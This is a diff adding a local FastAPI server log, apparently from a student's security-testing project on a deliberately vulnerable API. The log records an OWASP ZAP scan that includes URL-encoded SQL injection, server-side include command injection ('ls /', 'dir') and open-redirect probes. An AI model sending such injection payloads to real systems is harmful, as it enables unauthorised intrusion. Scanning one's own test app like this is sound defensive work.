@@ -1,0 +1,922 @@
+INFO:     Started server process [32938]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
+INFO:     127.0.0.1:48228 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48232 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48244 - "POST /auth/login HTTP/1.1" 200 OK
+INFO:     127.0.0.1:48258 - "GET /users/1 HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49442 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49442 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49442 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49442 - "GET /users/10 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49442 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49442 - "GET /admin/users HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49442 - "GET /debug/crash HTTP/1.1" 500 Internal Server Error
+ERROR:    Exception in ASGI application
+Traceback (most recent call last):
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/uvicorn/protocols/http/h11_impl.py", line 416, in run_asgi
+    result = await app(  # type: ignore[func-returns-value]
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        self.scope, self.receive, self.send
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/uvicorn/middleware/proxy_headers.py", line 63, in __call__
+    return await self.app(scope, receive, send)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/applications.py", line 1163, in __call__
+    await super().__call__(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/applications.py", line 96, in __call__
+    await self.middleware_stack(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/errors.py", line 186, in __call__
+    raise exc
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/errors.py", line 164, in __call__
+    await self.app(scope, receive, _send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/base.py", line 193, in __call__
+    response = await self.dispatch_func(request, call_next)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/vulnerable_api/app/main.py", line 22, in add_security_headers
+    response = await call_next(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/base.py", line 168, in call_next
+    raise app_exc from app_exc.__cause__ or app_exc.__context__
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/base.py", line 144, in coro
+    await self.app(scope, receive_or_disconnect, send_no_error)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/middleware/exceptions.py", line 63, in __call__
+    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
+    raise exc
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
+    await app(scope, receive, sender)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/middleware/asyncexitstack.py", line 18, in __call__
+    await self.app(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/routing.py", line 670, in __call__
+    await self.middleware_stack(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 2734, in app
+    await route.handle(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 1780, in handle
+    await self.original_router.handle(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 2789, in handle
+    await included_router._handle_selected(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 1800, in _handle_selected
+    await original_route.handle(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 1279, in handle
+    await app(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 158, in app
+    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/_exception_handler.py", line 53, in wrapped_app
+    raise exc
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/_exception_handler.py", line 42, in wrapped_app
+    await app(scope, receive, sender)
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 144, in app
+    response = await f(request)
+               ^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 706, in app
+    raw_response = await run_endpoint_function(
+                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<3 lines>...
+    )
+    ^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/fastapi/routing.py", line 354, in run_endpoint_function
+    return await run_in_threadpool(dependant.call, **values)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/starlette/concurrency.py", line 34, in run_in_threadpool
+    return await anyio.to_thread.run_sync(func)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/anyio/to_thread.py", line 65, in run_sync
+    return await get_async_backend().run_sync_in_worker_thread(
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        func, args, abandon_on_cancel=abandon_on_cancel, limiter=limiter
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/anyio/_backends/_asyncio.py", line 2641, in run_sync_in_worker_thread
+    return await future
+           ^^^^^^^^^^^^
+  File "/home/aline/Documentos/TCC/src/.venv/lib64/python3.14/site-packages/anyio/_backends/_asyncio.py", line 1033, in run
+    result = context.run(func, *args)
+  File "/home/aline/Documentos/TCC/src/vulnerable_api/app/routes/misc.py", line 8, in crash
+    raise RuntimeError("Falha simulada para teste de tratamento de erro.")
+RuntimeError: Falha simulada para teste de tratamento de erro.
+INFO:     127.0.0.1:49454 - "GET /1440197039954884170 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /admin/6795327995463240337 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /auth/8100865138556829129 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /debug/1617951559346829004 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /users/5290366942492555088 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=http%3A%2F%2Fwww.google.com%2F&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=http%3A%2F%2Fwww.google.com%3A80%2F&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=http%3A%2F%2Fwww.google.com&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=www.google.com%2F&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=www.google.com%3A80%2F&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=www.google.com&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=www.google.com%2Fsearch%3Fq%3DZAP&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=www.google.com%3A80%2Fsearch%3Fq%3DZAP&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=http%3A%2F%2Fwww.google.com%2F HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=http%3A%2F%2Fwww.google.com%3A80%2F HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=http%3A%2F%2Fwww.google.com HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=www.google.com%2F HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=www.google.com%3A80%2F HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=www.google.com HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=www.google.com%2Fsearch%3Fq%3DZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=www.google.com%3A80%2Fsearch%3Fq%3DZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=4198573975785783528.owasp.org&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=https%3A%2F%2F4198573975785783528.owasp.org&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=https%3A%2F%2F4198573975785783528%252eowasp%252eorg&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=5%3BURL%3D%27https%3A%2F%2F4198573975785783528.owasp.org%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=URL%3D%27http%3A%2F%2F4198573975785783528.owasp.org%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=https%3A%2F%2F4198573975785783528.owasp.org%2F%3Fusername&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=5%3BURL%3D%27https%3A%2F%2F4198573975785783528.owasp.org%2F%3Fusername%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=https%3A%2F%2F%5C4198573975785783528.owasp.org&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=http%3A%2F%2F%5C4198573975785783528.owasp.org&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=4198573975785783528.owasp.org HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=https%3A%2F%2F4198573975785783528.owasp.org HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=https%3A%2F%2F4198573975785783528%252eowasp%252eorg HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=5%3BURL%3D%27https%3A%2F%2F4198573975785783528.owasp.org%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=URL%3D%27http%3A%2F%2F4198573975785783528.owasp.org%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=https%3A%2F%2F4198573975785783528.owasp.org%2F%3FZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49494 - "GET /auth/login?username=username&password=5%3BURL%3D%27https%3A%2F%2F4198573975785783528.owasp.org%2F%3FZAP%27 HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=https%3A%2F%2F%5C4198573975785783528.owasp.org HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username&password=http%3A%2F%2F%5C4198573975785783528.owasp.org HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49494 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /admin HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /auth HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49494 - "GET /debug HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%27&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=%22&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username%22&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%3B&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%3B&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=%27%28&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%27%28&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username&password=ZAP HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 429 Too Many Requests
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username+AND+1%3D1+--+&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username%27+AND+%271%27%3D%271%27+--+&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%22+AND+%221%22%3D%221%22+--+&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username+AND+1%3D1&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%27+AND+%271%27%3D%271&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username%22+AND+%221%22%3D%221&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username+UNION+ALL+select+NULL+--+&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username%27+UNION+ALL+select+NULL+--+&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49478 - "GET /auth/login?username=username%22+UNION+ALL+select+NULL+--+&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49466 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49454 - "GET /auth/login?username=username%29+UNION+ALL+select+NULL+--+&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "POST /auth/login HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49478 - "PUT /users/10 HTTP/1.1" 422 Unprocessable Content
+INFO:     127.0.0.1:49466 - "GET /auth/login?username=username%27%29+UNION+ALL+select+NULL+--+&password=ZAP HTTP/1.1" 401 Unauthorized
+INFO:     127.0.0.1:49454 - "POST /auth/login HTTP/1.1" 401 Unauthorized
